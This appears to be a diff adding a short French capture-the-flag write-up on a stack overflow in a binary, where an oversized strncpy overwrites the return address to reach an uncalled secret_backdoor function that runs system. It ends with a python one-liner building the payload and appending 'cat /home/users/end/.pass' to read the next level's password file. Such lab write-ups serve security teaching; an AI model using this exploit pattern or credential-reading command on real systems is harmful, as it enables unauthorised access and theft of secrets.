@@ -1,0 +1,22 @@
+Ce programme contient une fonction secret_backdoor qui appel system et qui n'est
+jamais appele dans le code.
+Ce programme demande un nom et un message
+Lors de l'analyse du nom, le 41 eme charactere est recupere afin de definir la
+longueur de strncpy qui a lieu dans set_msg. Dans ce strncpy c'est le msg qui est
+pris en source et la destination sur la stack est plus ou moins situé 200 characteres
+avant l'adresse qui sera récupéré par RIP afin de retourner au bon niveau du main
+c'est a dire juste apres l'appel de handle_msg.
+C'est cette faiblesse que nous avons exploitée.
+La premiere string, le nom, est une chaine qui comporte 40 characteres et qui a
+pour 41 eme charactere "\xca" = 202, le message est une string de 200 characteres
+qui aura pour deux derniers characteres "\x8c\x48" ce qui permettra que secret_backdoor
+soit appelé
+
+dans le cas normal on retourne a cette adresse
+       0x0000555555554abd <main+21>
+apres modification on va sauter a cette adresse
+       0x000055555555488c <secret_backdoor+0>
+
+une fois dans secret_backdoor, system est appelé et permet d'executer une commande.
+
+python -c 'print "A" * 40 + "\xca" + "\n" + "B" * 200 + "\x8c\x48"  + "\n" + "cat /home/users/end/.pass"' > /tmp/exploit
